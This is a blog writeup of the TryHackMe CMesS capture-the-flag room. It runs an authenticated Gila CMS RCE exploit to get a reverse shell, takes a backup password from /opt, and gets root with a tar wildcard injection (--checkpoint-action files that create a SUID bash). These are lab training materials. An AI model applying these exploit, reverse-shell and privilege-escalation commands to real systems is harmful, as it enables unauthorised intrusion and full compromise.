---
layout : post
title: CMesS

subtitle: TryHackMe Writeup - CMesS

description: A step-by-step guide to rooting the CMesS machine on TryHackMe, inspired by Mr. Robot.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/1516b0c85bb9f7312a88638df5b0f3af.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/1516b0c85bb9f7312a88638df5b0f3af.png
category: tryhackme
tags:
  - TryHackMe
  - Privilege Escalation
  - Web Exploitation
author: Mustafa Altayeb
date: 2025-10-30 00:00
paginate: true
---

# CMesS  
- TryHackMe Writeup..

[CMesS](https://tryhackme.com/room/cmess)

---

## Objectives
1. Gain initial access via Gila CMS RCE  
2. Escalate from `www-data` to user `andre`  
3. Escalate from `andre` to `root` using **Tar Wildcard PrivEsc**

---

## add Domain to Hosts
```bash
nano /etc/hosts
```
insert **cmess.thm and ip address to this room**

![](/assets/TryHackMeRoomsImage/cmess/image.png)

Now let's start : 

## Reconnaissance

### Nmap Scan
Run an Nmap scan to identify open ports and services:
```bash
nmap -p- -sCV -T4 10.10.70.174
```

**Results**:
```js
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Gila CMS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings**:
- **Port 22**:OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
- **Port 80**: Apache httpd 2.4.18 ((Ubuntu)) with Gila CMS running on linux 


### Web Enumeration
Visiting the web server on port 80 reveals:

![](/assets/TryHackMeRoomsImage/cmess/image2.png)

Normal web page and nothing interest here .

### directory enum with FUFF
>**ffuf -w /usr/share/wordlists/rockyou.txt -u http://10.10.70.174/FUZZ -fw 431**

Result:
```bash
search                  [Status: 200, Size: 3860, Words: 522, Lines: 108, Duration: 917ms]
                        [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 152ms]
#1bitch                 [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 296ms]
login                   [Status: 200, Size: 1583, Words: 377, Lines: 42, Duration: 85ms]
admin                   [Status: 200, Size: 1583, Words: 377, Lines: 42, Duration: 102ms]
&hearts;                [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 79ms]
#1pimp                  [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 112ms]
#1hottie                [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 101ms]
#1princess              [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 175ms]
#1stunna                [Status: 200, Size: 3874, Words: 522, Lines: 108, Duration: 176ms]
```
Key Findings:

/login

![](/assets/TryHackMeRoomsImage/cmess/image4.png)


### VHOST enum With FUFF

>**ffuf -w /usr/share/wordlists/rockyou.txt -u http://10.10.70.174 -H "HOST: FUZZ.cmess.thm"**

Result:
```bash
                [Status: 200, Size: 3886, Words: 522, Lines: 108, Duration: 82ms]
abc123                  [Status: 200, Size: 3886, Words: 522, Lines: 108, Duration: 90ms]
password                [Status: 200, Size: 3892, Words: 522, Lines: 108, Duration: 100ms]
123456789               [Status: 200, Size: 3895, Words: 522, Lines: 108, Duration: 109ms]
1234567                 [Status: 200, Size: 3889, Words: 522, Lines: 108, Duration: 107ms]
```
let's put -fw to filter number of word `522`

```bash
T4T4R1S  | Local IP ➜ 192.168.115.128 | VPN IP ➜ 10.14.109.66
~  ffuf -w /usr/share/wordlists/rockyou.txt -u http://10.10.70.174 -H "HOST: FUZZ.cmess.thm" -fw 522

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.70.174
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Host: FUZZ.cmess.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 522
________________________________________________

dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 6307ms]
```
**Results** :
dev : virtual host : 
**add dev.cmess.thm and machine ip to out host file**
and access it
![](/assets/TryHackMeRoomsImage/cmess/image3.png)

Find login credential `andre@cmess.thm`, `KPFTN_f2yxe%` 

Try to login to `/login` that we find in directory enumeration :

Login success let's navigate to `/admin` that we find in dirctory fuzz `http://cmess.thm/admin` :

![](/assets/TryHackMeRoomsImage/cmess/image5.png)

after enum this page i find 2 critical things: 
1. we can upload the file to gain access to this machine
2. Gila CMS version 1.10.9 by using `searchsploit` i find it has vulnerability:

--- 

## Initial Access 
```js
T4T4R1S  | Local IP ➜ 192.168.115.128 | VPN IP ➜ 10.14.109.66
~  searchsploit Gila CMS  1.10.9                                                              
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                       |  Path
--------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)                                                        | php/webapps/51569.py
```

I will use this script to gain RCE upload files is boring for me it's repeated daily . 

- show absolute path to the shell

```js
~  searchsploit -p 51569.py         

  Exploit: Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/51569
     Path: /usr/share/exploitdb/exploits/php/webapps/51569.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied EDB-ID #51569's path to the clipboard
```
now let's use it 
```bash
T4T4R1S  | Local IP ➜ 192.168.115.128 | VPN IP ➜ 10.14.109.66
~  python3 51569.py

 ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗                                                                
██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝                                                                
██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗                                                                  
██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝                                                                  
╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗                                                                
 ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝                                                                
                                                                                                                                                       
                              by Unknown_Exploit                                                                                                       
                                                                                                                                                       
Enter the target login URL (e.g., http://example.com/admin/): http://cmess.thm/admin
Enter the email: andre@cmess.thm
Enter the password: KPFTN_f2yxe%
Enter the local IP (LHOST): 10.14.109.66
Enter the local port (LPORT): 9090
File uploaded successfully.
```
after complete the last step open listener :
```bash
rlwrap nc -nlvp 9090
```

### Gain a shell
```bash
T4T4R1S  | Local IP ➜ 192.168.115.128 | VPN IP ➜ 10.14.109.66
~  rlwrap nc -nlvp 9090
listening on [any] 9090 ...
connect to [10.14.109.66] from (UNKNOWN) [10.10.70.174] 44782
bash: cannot set terminal process group (732): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cmess:/var/www/html/tmp$ whoami
whoami
www-data
```
I try harder to get any thing interested but noting after that i tried to search for some words like `Password` : 

```bash
www-data@cmess:/home$ find . / -name *password* 2>/dev/null
find . / -name *password* 2>/dev/null
/usr/share/pam/common-password.md5sums
/usr/share/pam/common-password
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/help-langpack/en_AU/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_GB/zenity/password.page
/usr/share/help-langpack/en_GB/evince/password.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-changepassword.page
/usr/share/icons/Adwaita/scalable/status/dialog-password-symbolic.svg
/usr/share/icons/Humanity/status/24/dialog-password.png
/usr/share/icons/Humanity/status/16/dialog-password.png
/usr/share/icons/Humanity/status/48/dialog-password.svg
/usr/share/icons/Humanity/apps/24/password.png
/usr/share/icons/Humanity/apps/48/password.svg
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/mysql/plugin/validate_password.so
/etc/pam.d/common-password
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/opt/.password.bak
/run/systemd/ask-password
/var/cache/debconf/passwords.dat
/var/www/html/src/core/views/login-change-password.php
/var/lib/pam/password
/lib/systemd/systemd-reply-password
/lib/systemd/system/systemd-ask-password-plymouth.service
/lib/systemd/system/systemd-ask-password-wall.service
/lib/systemd/system/systemd-ask-password-plymouth.path
/lib/systemd/system/systemd-ask-password-console.service
/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/lib/systemd/system/systemd-ask-password-console.path
/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/lib/systemd/system/systemd-ask-password-wall.path
/boot/grub/i386-pc/password_pbkdf2.mod
/boot/grub/i386-pc/legacy_password_test.mod
/boot/grub/i386-pc/password.mod
www-data@cmess:/home$ 
```
after enum this file i find in `/opt/.password.bak` a password for andre user :
```bash
www-data@cmess:/home$ cat /opt/.password.bak
cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```

Trying to login with ssh to user andre : 
```bash
T4T4R1S  | Local IP ➜ 192.168.115.128 | VPN IP ➜ 10.14.109.66
~  ssh andre@10.10.70.174
andre@10.10.70.174's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20
andre@cmess:~$ 
```
SUCCESS....! 

## user flag :
```bash
andre@cmess:~$ ls
backup  user.txt
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7.........}
```

# Privilege Escalation 

after enum the system SUID ,Sudo , Kernal , cron job ... i find a wildcard with tar :

```js
andre@cmess:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

Now i have to explain something

we have `tar -zcf /tmp/andre_backup.tar.gz *` that executed every 2 minutes 
and it's have * to backup all file in the `/home/andre/backup` directory 
when it go to this file * converted to all file names in this dirctory like
if we hav files called `file.txt` `file2.txt`  in the dirctory 
this command `tar -zcf /tmp/andre_backup.tar.gz *` will be `tar -zcf file.txt file2.txt`

Ok why this dangerous 
tar has a flages called `--checkpoint `that make it do something after n period  and `--checkpoint-action` that's specified the action 

in our case we will make a file called `--checkpoint=1` and file called `--checkpoint-action=exec=sh\ shell.sh`

after create this files we create shell to execute it with tar  to get root

- add shell to file 
>**echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash;' > shell.sh**

-create checkpoints 
>**touch /home/andre/backup/--checkpoint=1**
>**touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh**

after 2 minutes run `/tmp/bash -p` to gain root :
```js
bash-4.3$ /tmp/bash -p
bash-4.3# whoami
root
```
## Root flag 
```js
bash-4.3# cat root.txt
thm{9f85b7fdeb2cf96985bf5761..........}
```
Finished. Happy Hacking!
---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>

Follow me:
- [LinkedIn](https://www.linkedin.com/in/t4t4r1s/)
- [X](https://x.com/T4T4R1S)
---
